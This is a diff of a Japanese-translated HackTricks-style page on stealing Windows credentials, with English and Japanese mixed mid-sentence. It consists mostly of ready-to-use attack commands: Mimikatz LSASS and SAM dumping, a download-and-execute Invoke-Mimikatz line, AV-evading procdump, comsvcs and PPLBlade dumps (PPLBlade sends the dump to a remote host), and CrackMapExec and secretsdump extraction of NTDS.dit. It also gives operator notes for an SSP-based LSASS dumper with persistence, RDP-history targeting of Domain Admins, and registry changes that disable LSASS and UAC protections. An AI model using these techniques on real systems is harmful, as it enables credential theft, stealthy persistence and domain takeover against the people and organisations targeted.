@@ -1,8 +1,8 @@
-# Windowsの資格情報の盗難
+# Windows Credentials の窃取
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## 資格情報 Mimikatz
+## Credentials Mimikatz
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -16,7 +16,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Mimikatzができる他のことを** [**このページ**](credentials-mimikatz.md)**で見つけてください。**
+**Mimikatz ができる他のことは [**this page**](credentials-mimikatz.md) で確認してください。**
 
 ### Invoke-Mimikatz
 ```bash
@@ -24,11 +24,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**ここでいくつかの可能な資格情報保護について学びましょう。**](credentials-protections.md) **この保護は、Mimikatzが一部の資格情報を抽出するのを防ぐことができます。**
+[**Learn about some possible credentials protections here.**](credentials-protections.md) **これらの保護により、Mimikatzが一部のcredentialsを抽出するのを防げる可能性があります。**
 
-## Meterpreterによる資格情報
+## Credentials with Meterpreter
 
-私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用して、** 被害者の内部で **パスワードとハッシュを検索します。**
+[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)は**私が作成した**もので、被害者内部の**passwords and hashes**を検索するために使用します。
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -45,14 +45,14 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-## AVをバイパスする
+## AVの回避
 
 ### Procdump + Mimikatz
 
-**SysInternalsの** [**Procdump** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**は正当なMicrosoftツール**であるため、Defenderに検出されません。\
-このツールを使用して、**lsassプロセスをダンプ**し、**ダンプをダウンロード**し、**ダンプからローカルに** **資格情報を抽出**できます。
+**Procdump from** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**は正規のMicrosoftツールであるため**、Defenderに検出されません。\
+このツールを使用して、**dump the lsass process**、**download the dump**、およびダンプから**extract**して**credentials locally**を取り出せます。
 
-[SharpDump](https://github.com/GhostPack/SharpDump)を使用することもできます。
+また、[SharpDump](https://github.com/GhostPack/SharpDump)を使用することもできます。
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -69,96 +69,112 @@ mimikatz # sekurlsa::minidump lsass.dmp
 //Extract credentials
 mimikatz # sekurlsa::logonPasswords
 ```
-このプロセスは自動的に [SprayKatz](https://github.com/aas-n/spraykatz) を使用して行われます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+この処理は [SprayKatz](https://github.com/aas-n/spraykatz) を使って自動的に実行できます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**注意**: 一部の **AV** は **procdump.exe を使用して lsass.exe をダンプすること** を **悪意のある** 行為として **検出** する可能性があります。これは、**"procdump.exe" と "lsass.exe"** という文字列を **検出** しているためです。したがって、lsass.exe の **PID** を procdump に **名前 lsass.exe の代わりに** **引数** として渡す方が **ステルス性** が高いです。
+**注意**: 一部の **AV** は **procdump.exe to dump lsass.exe** の使用を **malicious** と **detect** する場合があります。これは **"procdump.exe" and "lsass.exe"** という文字列を **detecting** しているためです。したがって、**name lsass.exe** の代わりに lsass.exe の **PID** を procdump に **argument** として **pass** する方が **stealthier** です。
 
-### **comsvcs.dll** を使用した lsass のダンプ
+### Dumping lsass with **comsvcs.dll**
 
-`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ時に **プロセスメモリをダンプする** 役割を担っています。この DLL には、`rundll32.exe` を使用して呼び出すように設計された **`MiniDumpW`** という **関数** が含まれています。\
-最初の2つの引数は無関係ですが、3つ目の引数は3つのコンポーネントに分かれています。ダンプされるプロセスIDが最初のコンポーネントを構成し、ダンプファイルの場所が2番目を表し、3番目のコンポーネントは厳密に **full** という単語です。代替オプションは存在しません。\
-これら3つのコンポーネントを解析すると、DLL はダンプファイルを作成し、指定されたプロセスのメモリをこのファイルに転送します。\
-**comsvcs.dll** を利用することで lsass プロセスをダンプすることが可能であり、procdump をアップロードして実行する必要がなくなります。この方法の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) に記載されています。
+`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ時に **dumping process memory** を行う役割を持っています。この DLL には `MiniDumpW` という **function** が含まれており、`rundll32.exe` を使って呼び出されるよう設計されています。\
+最初の2つの引数の内容は重要ではありませんが、3番目の引数は3つのコンポーネントに分かれます。ダンプするプロセスのプロセス ID が第1コンポーネント、ダンプファイルの場所が第2コンポーネント、そして第3コンポーネントは厳密に単語の **full** のみです。ほかの選択肢はありません。\
+これら3つのコンポーネントを解析すると、DLL はダンプファイルを作成し、指定されたプロセスのメモリをそのファイルへ書き込みます。\
+**comsvcs.dll** を使えば lsass プロセスをダンプできるため、procdump をアップロードして実行する必要がなくなります。この方法は詳しくは [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) に記載されています。
 
-実行に使用されるコマンドは次のとおりです:
+The following command is employed for execution:
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
-**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**を使って自動化できます。**
+**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**
 
-### **タスクマネージャーを使ったlsassのダンプ**
+### **Task Managerを使ったlsassのダンプ取得**
 
-1. タスクバーを右クリックし、タスクマネージャーをクリックします
-2. 詳細をもっとクリックします
-3. プロセスタブで「Local Security Authority Process」プロセスを検索します
-4. 「Local Security Authority Process」プロセスを右クリックし、「ダンプファイルの作成」をクリックします。
+1. Task Bar を右クリックして Task Manager をクリック
+2. More details をクリック
+3. Processes タブで "Local Security Authority Process" プロセスを検索
+4. "Local Security Authority Process" を右クリックし、"Create dump file" をクリック
 
-### procdumpを使ったlsassのダンプ
+### Dumping lsass with procdump
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/)スイートの一部であるMicrosoft署名のバイナリです。
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) は Microsoft によって署名されたバイナリで、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/) スイートの一部です。
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-## Dumpin lsass with PPLBlade
+## PPLBlade を使って lsass をダンプする
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は、メモリダンプを難読化し、ディスクに落とさずにリモートワークステーションに転送することをサポートする保護プロセスダンプツールです。
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は、ディスクに書き込まずに memory dump を難読化してリモートワークステーションへ転送することをサポートする Protected Process Dumper Tool です。
 
 **主な機能**:
 
-1. PPL保護のバイパス
-2. Defenderの署名ベースの検出メカニズムを回避するためのメモリダンプファイルの難読化
-3. ディスクに落とさずにRAWおよびSMBアップロードメソッドでメモリダンプをアップロードする（ファイルレスダンプ）
+1. PPL 保護のバイパス
+2. Defender のシグネチャベースの検出を回避するための memory dump ファイルの難読化
+3. ディスクに落とさずに (fileless dump) RAW および SMB アップロード方式で memory dump をアップロード
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
+## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump
+
+Ink Dragon は **LalsDumper** と呼ばれる3段階のダンプツールを提供します。`MiniDumpWriteDump` を一切呼び出さないため、その API に対する EDR のフックは発動しません:
+
+1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` 内の 32 個の小文字の `d` からなるプレースホルダを検索し、それを `rtu.txt` の絶対パスで上書きし、パッチ済みの DLL を `nfdp.dll` として保存し、`AddSecurityPackageA("nfdp","fdp")` を呼び出します。これにより **LSASS** は悪意のある DLL を新しい Security Support Provider (SSP) としてロードします。
+2. **Stage 2 inside LSASS** – LSASS が `nfdp.dll` をロードすると DLL は `rtu.txt` を読み込み、各バイトを `0x20` で XOR し、デコードされた blob をメモリにマップしてから実行を移します。
+3. **Stage 3 dumper** – マップされたペイロードは、ハッシュ化された API 名から解決された **direct syscalls** を使って MiniDump のロジックを再実装します（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）。専用のエクスポート `Tom` は `%TEMP%\<pid>.ddt` を開き、圧縮された LSASS ダンプをファイルにストリームし、ハンドルを閉じて後で exfiltration を行えるようにします。
+
+Operator notes:
+
+* `lals.exe`, `fdp.dll`, `nfdp.dll`, `rtu.txt` を同一ディレクトリに置いてください。Stage 1 はハードコードされたプレースホルダを `rtu.txt` の絶対パスで書き換えるため、ファイルを分けるとチェーンが切れます。
+* 登録は `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` に `nfdp` を追加することで行われます。自分でその値を設定しておけば、LSASS は毎回起動時に SSP を再ロードします。
+* `%TEMP%\*.ddt` ファイルは圧縮されたダンプです。ローカルで解凍してから Mimikatz/Volatility に渡して credential extraction を行ってください。
+* `lals.exe` の実行には admin/SeTcb 権限が必要で、`AddSecurityPackageA` を成功させる必要があります。呼び出しが戻ると、LSASS は透過的に不正な SSP をロードして Stage 2 を実行します。
+* ディスク上から DLL を削除しても LSASS からは解放されません。レジストリエントリを削除して LSASS を再起動（reboot）するか、そのまま long-term persistence として残しておいてください。
+
 ## CrackMapExec
 
-### SAMハッシュをダンプする
+### SAM ハッシュをダンプ
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### LSAシークレットのダンプ
+### Dump LSA secrets
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### ターゲットDCからNTDS.ditをダンプする
+### ターゲット DC から NTDS.dit をダンプする
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### ターゲットDCからNTDS.ditパスワード履歴をダンプする
+### ターゲット DC から NTDS.dit のパスワード履歴をダンプする
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
-### 各 NTDS.dit アカウントの pwdLastSet 属性を表示する
+### 各 NTDS.dit アカウントの pwdLastSet 属性を表示
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-## SAM & SYSTEMの盗難
+## Stealing SAM & SYSTEM
 
-これらのファイルは**_C:\windows\system32\config\SAM_**および**_C:\windows\system32\config\SYSTEM._**に**存在する必要があります**。しかし、**通常の方法でコピーすることはできません**。なぜなら、それらは保護されているからです。
+これらのファイルは _C:\windows\system32\config\SAM_ および _C:\windows\system32\config\SYSTEM_ に **格納されています**。しかし、これらは保護されているため、**通常の方法で単純にコピーすることはできません**。
 
 ### レジストリから
 
-これらのファイルを盗む最も簡単な方法は、レジストリからコピーを取得することです：
+これらのファイルを取得する最も簡単な方法は、レジストリからコピーを取ることです：
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**ダウンロード** したファイルをあなたの Kali マシンに保存し、次のコマンドを使用して **ハッシュを抽出** します:
+**Download** それらのファイルを Kali マシンにダウンロードし、次のコマンドで **extract the hashes**:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-### ボリュームシャドウコピー
+### Volume Shadow Copy
 
-このサービスを使用して保護されたファイルのコピーを実行できます。管理者である必要があります。
+このサービスを使用して保護されたファイルのコピーを取得できます。Administrator 権限が必要です。
 
-#### vssadminの使用
+#### Using vssadmin
 
-vssadminバイナリはWindows Serverバージョンでのみ利用可能です。
+vssadmin バイナリは Windows Server のバージョンでのみ利用可能です。
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -171,7 +187,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-しかし、**Powershell**を使っても同じことができます。これは**SAMファイルをコピーする方法**の例です（使用するハードドライブは"C:"で、C:\users\Publicに保存されます）が、これは保護されたファイルをコピーするためにも使用できます：
+ただし、同じことは**Powershell**でも行えます。これは**how to copy the SAM file**の例です（使用するハードドライブは "C:"、保存先は C:\users\Public）ですが、任意の保護されたファイルをコピーする目的でも使用できます：
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -180,88 +196,90 @@ $volume=(gwmi win32_shadowcopy -filter "ID='$id'")
 cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
 $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
+書籍のコード: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
+
 ### Invoke-NinjaCopy
 
-最後に、[**PSスクリプト Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)を使用して、SAM、SYSTEM、およびntds.ditのコピーを作成することもできます。
+最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) を使って SAM、SYSTEM、ntds.dit のコピーを作成することもできます。
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
-## **Active Directory Credentials - NTDS.dit**
+## **Active Directory 資格情報 - NTDS.dit**
 
-**NTDS.dit**ファイルは**Active Directory**の中心として知られ、ユーザーオブジェクト、グループ、およびそのメンバーシップに関する重要なデータを保持しています。ここにはドメインユーザーの**パスワードハッシュ**が保存されています。このファイルは**Extensible Storage Engine (ESE)**データベースであり、**_%SystemRoom%/NTDS/ntds.dit_**に存在します。
+The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.
 
-このデータベース内には、3つの主要なテーブルが維持されています：
+Within this database, three primary tables are maintained:
 
-- **データテーブル**: このテーブルはユーザーやグループなどのオブジェクトに関する詳細を保存する役割を担っています。
-- **リンクテーブル**: グループメンバーシップなどの関係を追跡します。
-- **SDテーブル**: 各オブジェクトの**セキュリティ記述子**がここに保持され、保存されたオブジェクトのセキュリティとアクセス制御を確保します。
+- **Data Table**: このテーブルはユーザーやグループのようなオブジェクトの詳細を格納します。
+- **Link Table**: グループメンバーシップなどの関係を追跡します。
+- **SD Table**: **Security descriptors** が各オブジェクトごとに格納され、格納されたオブジェクトのセキュリティとアクセス制御を担保します。
 
-これに関する詳細情報: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
+More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windowsは_Ntdsa.dll_を使用してそのファイルと対話し、_lsass.exe_によって使用されます。次に、**NTDS.dit**ファイルの**一部**は**`lsass`**メモリ内に存在する可能性があります（パフォーマンス向上のために**キャッシュ**を使用して最新のアクセスデータを見つけることができます）。
+Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **一部** of the **NTDS.dit** file could be located **`lsass` のメモリ内** (パフォーマンス向上のために**キャッシュ**を使用しているため、最近アクセスされたデータが見つかることが多いです)。
 
-#### NTDS.dit内のハッシュの復号化
+#### NTDS.dit 内のハッシュの復号
 
-ハッシュは3回暗号化されています：
+ハッシュは3回暗号化されています:
 
-1. **BOOTKEY**と**RC4**を使用してパスワード暗号化キー（**PEK**）を復号化します。
-2. **PEK**と**RC4**を使用して**ハッシュ**を復号化します。
-3. **DES**を使用して**ハッシュ**を復号化します。
+1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
+2. Decrypt the **hash** using **PEK** and **RC4**.
+3. Decrypt the **hash** using **DES**.
 
-**PEK**は**すべてのドメインコントローラーで同じ値**を持っていますが、**NTDS.dit**ファイル内ではドメインコントローラーの**SYSTEMファイルのBOOTKEY**を使用して**暗号化**されています（ドメインコントローラー間で異なります）。これが、NTDS.ditファイルから資格情報を取得するために**NTDS.ditとSYSTEMファイルが必要**な理由です（_C:\Windows\System32\config\SYSTEM_）。
+**PEK** は **すべてのドメインコントローラ** で **同じ値** を持ちますが、**ドメインコントローラの SYSTEM ファイルの BOOTKEY を使用して** **NTDS.dit** ファイル内で **暗号化** されています（ドメインコントローラごとに異なります）。このため、NTDS.dit ファイルから資格情報を取得するには **NTDS.dit と SYSTEM のファイルが必要** です (_C:\Windows\System32\config\SYSTEM_)。
 
-### Ntdsutilを使用したNTDS.ditのコピー
+### Ntdsutil を使用した NTDS.dit のコピー
 
-Windows Server 2008以降で利用可能です。
+Windows Server 2008 以降で利用可能です。
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-あなたはまた、[**ボリュームシャドウコピー**](#stealing-sam-and-system)のトリックを使って**ntds.dit**ファイルをコピーすることができます。**SYSTEMファイル**のコピーも必要であることを忘れないでください（再度、[**レジストリからダンプするか、ボリュームシャドウコピー**](#stealing-sam-and-system)のトリックを使用してください）。
+また、[**volume shadow copy**](#stealing-sam-and-system) トリックを使って **ntds.dit** ファイルをコピーすることもできます。**SYSTEM file** のコピーも必要になることを忘れないでください（再度、[**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) トリック）。
 
-### **NTDS.ditからハッシュを抽出する**
+### **NTDS.dit からハッシュを抽出する**
 
-**NTDS.dit**と**SYSTEM**ファイルを**取得**したら、_secretsdump.py_のようなツールを使用して**ハッシュを抽出**できます：
+一旦 **NTDS.dit** と **SYSTEM** ファイルを**取得**すれば、_secretsdump.py_ のようなツールで**ハッシュを抽出**できます：
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-有効なドメイン管理者ユーザーを使用して、**自動的に抽出する**こともできます。
+有効な domain admin user を使用して、**それらを自動的に抽出することもできます**:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-**大きな NTDS.dit ファイル**については、[gosecretsdump](https://github.com/c-sto/gosecretsdump)を使用して抽出することをお勧めします。
+大きな **NTDS.dit ファイル** の場合は、[gosecretsdump](https://github.com/c-sto/gosecretsdump) を使って抽出することを推奨します。
 
-最後に、**metasploit モジュール**: _post/windows/gather/credentials/domain_hashdump_ または **mimikatz** `lsadump::lsa /inject` を使用することもできます。
+最後に、**metasploit module**: _post/windows/gather/credentials/domain_hashdump_ または **mimikatz** `lsadump::lsa /inject` を使用することもできます。
 
-### **NTDS.dit から SQLite データベースへのドメインオブジェクトの抽出**
+### **NTDS.dit から SQLite データベースへドメインオブジェクトを抽出する**
 
-NTDS オブジェクトは、[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)を使用して SQLite データベースに抽出できます。秘密だけでなく、取得した生の NTDS.dit ファイルからさらなる情報抽出のために、オブジェクト全体とその属性も抽出されます。
+NTDS オブジェクトは [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使って SQLite データベースに抽出できます。raw NTDS.dit ファイルが既に取得されている場合、秘密情報だけでなく、さらなる情報抽出のためにオブジェクト全体とその属性も抽出されます。
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` ハイブはオプションですが、秘密の復号化を可能にします（NT & LM ハッシュ、平文パスワード、Kerberos または信頼キー、NT & LM パスワード履歴などの補足資格情報）。他の情報とともに、以下のデータが抽出されます：ユーザーおよびマシンアカウントとそのハッシュ、UAC フラグ、最終ログオンおよびパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループおよび再帰的メンバーシップ、組織単位ツリーおよびメンバーシップ、信頼されたドメインと信頼の種類、方向および属性...
+The `SYSTEM` hiveはオプションですが、secretsの復号を可能にします（NT & LM hashes、supplemental credentials such as cleartext passwords、kerberos or trust keys、NT & LM password histories）。その他の情報と併せて、以下のデータが抽出されます : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...
 
 ## Lazagne
 
-バイナリは[こちら](https://github.com/AlessandroZ/LaZagne/releases)からダウンロードしてください。このバイナリを使用して、いくつかのソフトウェアから資格情報を抽出できます。
+Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). このバイナリを使用して、複数のソフトウェアからcredentialsを抽出できます。
 ```
 lazagne.exe all
 ```
-## SAMおよびLSASSからの資格情報を抽出するための他のツール
+## SAM と LSASS から credentials を抽出するその他のツール
 
 ### Windows credentials Editor (WCE)
 
-このツールは、メモリから資格情報を抽出するために使用できます。ダウンロードはこちらから: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+このツールはメモリから credentials を抽出するために使用できます。ダウンロード: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-SAMファイルから資格情報を抽出します。
+SAM ファイルから credentials を抽出する
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
 ```
 ### PwDump
 
-SAMファイルから資格情報を抽出します。
+SAM fileから資格情報を抽出する
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
@@ -269,10 +287,53 @@ type outpwdump
 ```
 ### PwDump7
 
-ダウンロードはこちらから: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) そして **実行するだけで** パスワードが抽出されます。
+ここからダウンロード: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) を取得して、**実行するだけで** パスワードが抽出されます。
 
-## Defenses
+## Mining idle RDP sessions and weakening security controls
 
-[**ここでいくつかの資格情報保護について学びましょう。**](credentials-protections.md)
+Ink Dragon’s FinalDraft RAT には `DumpRDPHistory` タスクが含まれており、その手法はどの red-teamer にとっても有用です:
+
+### DumpRDPHistory-style テレメトリ収集
+
+* **Outbound RDP targets** – parse every user hive at `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Each subkey stores the server name, `UsernameHint`, and the last write timestamp. You can replicate FinalDraft’s logic with PowerShell:
+
+```powershell
+Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
+Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
+ForEach-Object {
+$server = Split-Path $_.Name -Leaf
+$user = (Get-ItemProperty $_.Name).UsernameHint
+"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
+}
+}
+```
+
+* **Inbound RDP evidence** – query the `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log for Event IDs **21**（成功したログオン）および **25**（切断）を確認して、誰がそのボックスを管理していたかを特定します:
+
+```powershell
+Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
+| Where-Object { $_.Id -in 21,25 } \
+| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
+```
+
+どの Domain Admin が定期的に接続しているかが分かったら、その **切断された** セッションが存在する間に LSASS を（LalsDumper/Mimikatz で）ダンプします。CredSSP + NTLM fallback により検証データとトークンが LSASS に残され、それらは SMB/WinRM 経由でリプレイして `NTDS.dit` を取得したり、domain controllers に永続化を仕掛けるために利用できます。
+
+### Registry downgrades targeted by FinalDraft
+
+同じ implant は、credential theft を容易にするためにいくつかの registry keys を改ざんします:
+```cmd
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
+```
+* `DisableRestrictedAdmin=1` を設定すると、RDP 中に資格情報/チケットの完全再利用を強制し、pass-the-hash style pivots を可能にします。
+* `LocalAccountTokenFilterPolicy=1` は UAC のトークンフィルタリングを無効化し、ローカル管理者がネットワーク経由で制限のないトークンを取得できるようにします。
+* `DSRMAdminLogonBehavior=2` は DC がオンラインの間も DSRM 管理者のログオンを許可し、攻撃者に別の組み込みの高権限アカウントを与えます。
+* `RunAsPPL=0` は LSASS の PPL 保護を削除し、LalsDumper のような dumpers にとってメモリへのアクセスを容易にします。
+
+## 参照
+
+- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
 
 {{#include ../../banners/hacktricks-training.md}}
